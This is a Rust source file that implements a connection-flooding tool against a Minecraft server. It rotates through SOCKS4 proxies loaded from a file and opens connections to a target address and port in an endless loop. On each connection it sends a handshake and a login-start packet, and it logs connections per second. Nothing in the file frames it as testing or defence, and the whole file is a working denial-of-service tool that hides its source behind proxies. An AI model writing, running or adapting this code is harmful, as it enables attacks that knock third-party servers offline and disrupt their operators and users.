use std::collections::HashMap;
use std::time::{SystemTime, UNIX_EPOCH};
use std::{fs, net::SocketAddrV4, sync::atomic::Ordering, sync::Arc};
use std::{net::Ipv4Addr, sync::atomic::AtomicU64, time::Duration};

use clap::Parser;
use color_eyre::eyre::{Context, OptionExt};
use packet_utils::{send_handshake, send_login_start};
use rust_mc_proto_tokio::{MCConnTcp, Packet};
use tokio::net::TcpStream;
use tokio::sync::Mutex;
use tokio::time::timeout;
use tokio::{
    sync::{OwnedSemaphorePermit, Semaphore},
    time::sleep,
};
use tokio_socks::tcp::Socks4Stream;
use tracing::{error, info, info_span, level_filters::LevelFilter, trace, Instrument};
mod packet_utils;

#[derive(Debug, Parser)]
struct Args {
    server_address: Ipv4Addr,
    server_port: u16,
    threads: u32,
}

#[tokio::main(flavor = "current_thread")]
async fn main() -> color_eyre::Result<()> {
    color_eyre::install()?;
    tracing_subscriber::fmt()
        .with_max_level(LevelFilter::TRACE)
        .init();

    let args = Args::parse();
    let target = (args.server_address, args.server_port);
    let proxies = Arc::new(load_proxies()?);
    let disabled_proxies = Arc::new(Mutex::new(HashMap::new()));
    let connections = Arc::new(AtomicU64::new(0));
    let failures = Arc::new(AtomicU64::new(0));

    tokio::spawn(write_stats(connections.clone(), failures.clone()));
    let mut proxy_index = 0;
    let semaphore = Arc::new(Semaphore::new(args.threads as usize));
    let mut connection_index = 0;
    loop {
        trace!("Acquiring semaphore permit");
        let permit = semaphore.clone().acquire_owned().await?;
        trace!("Acquired semaphore permit");
        proxy_index = (proxy_index + 1) % proxies.len();
        let proxies = proxies.clone();
        let failures = failures.clone();
        let connections = connections.clone();
        let disabled_proxies = disabled_proxies.clone();
        trace!("Spawning connection {connection_index} for target {target:?}");
        tokio::spawn(async move {
            let proxy = get_proxy(proxy_index, &disabled_proxies, proxies).await;
            timeout(
                Duration::from_secs(2),
                connect_to_proxy(
                    proxy,
                    target,
                    connections,
                    failures,
                    permit,
                    disabled_proxies,
                ),
            )
            .instrument(info_span!(
                "connect_to_proxy",
                connection = connection_index,
                proxy = %proxy,
            ))
            .await
        });
        connection_index += 1;
        trace!("Spawned connection {connection_index} for target {target:?}");
    }
}
async fn get_proxy(
    start: usize,
    disabled_proxies: &Arc<Mutex<HashMap<SocketAddrV4, u128>>>,
    proxies: Arc<Vec<SocketAddrV4>>,
) -> SocketAddrV4 {
    let mut proxy_index = start;
    let mut proxy;
    loop {
        proxy_index = (proxy_index + 1) % proxies.len();
        proxy = proxies.get(proxy_index).unwrap();
        trace!("hve");

        match disabled_proxies.lock().await.get(proxy) {
            Some(value) => {
                if value < &get_current_time_millis() {
                    disabled_proxies.lock().await.remove(proxy);
                    trace!("removed proxy from disableds");
                    break;
                }
            }
            None => {
                break;
            }
        }
    }
    *proxy
}
async fn connect_to_proxy(
    proxy: SocketAddrV4,
    target: (Ipv4Addr, u16),
    connections: Arc<AtomicU64>,
    failures: Arc<AtomicU64>,
    permit: OwnedSemaphorePermit,
    disabled_proxies: Arc<Mutex<HashMap<SocketAddrV4, u128>>>,
) {
    trace!("Connecting to proxy {proxy}");
    match Socks4Stream::connect(proxy, target).await {
        Ok(stream) => {
            trace!("Successfully connected to proxy {proxy}");
            connections.fetch_add(1, Ordering::Relaxed);
            send_mc_packet(target, stream.into_inner()).await;
        }
        Err(err) => {
            disabled_proxies
                .lock()
                .await
                .insert(proxy, get_current_time_millis() + 2000);
            error!("Failed to connect to proxy {proxy}: {err}");
            failures.fetch_add(1, Ordering::Relaxed);
        }
    }
    trace!("Dropping semaphore permit");
    drop(permit);
}
fn get_current_time_millis() -> u128 {
    let start = SystemTime::now();
    start
        .duration_since(UNIX_EPOCH)
        .expect("Time went backwards")
        .as_millis()
}
async fn send_mc_packet(target: (Ipv4Addr, u16), stream: TcpStream) {
    let protocol_version = 770;
    let mut conn = MCConnTcp::new(stream);

    // Switch to login state (2)
    send_handshake(
        &mut conn,
        protocol_version,
        target.0.to_string().as_str(),
        target.1,
        2,
    )
    .await;

    // Send login start packet
    send_login_start(&mut conn, "test").await;

    conn.write_packet(&Packet::empty(0x03)).await.ok();
}

#[tracing::instrument(skip_all)]
async fn write_stats(cps: Arc<AtomicU64>, fails: Arc<AtomicU64>) {
    loop {
        sleep(Duration::from_secs(1)).await;
        info!(
            "cps: {cps} fails: {fails}",
            cps = cps.swap(0, Ordering::Relaxed),
            fails = fails.swap(0, Ordering::Relaxed),
        );
    }
}

fn load_proxies() -> color_eyre::Result<Vec<SocketAddrV4>> {
    fs::read_to_string("proxies.txt")
        .wrap_err("couldn't find proxies.txt")?
        .lines()
        .map(|line| {
            let mut parts = line.split(":");
            let addr = parts.next().ok_or_eyre("missing server address")?;
            let port = parts.next().ok_or_eyre("missing port")?;

            let addr = addr
                .parse::<Ipv4Addr>()
                .wrap_err("couldn't parse target as ipv4 addr")?;
            let port = port
                .parse::<u16>()
                .wrap_err("couldn't parse port as an u16")?;
            Ok(SocketAddrV4::new(addr, port))
        })
        .collect()
}
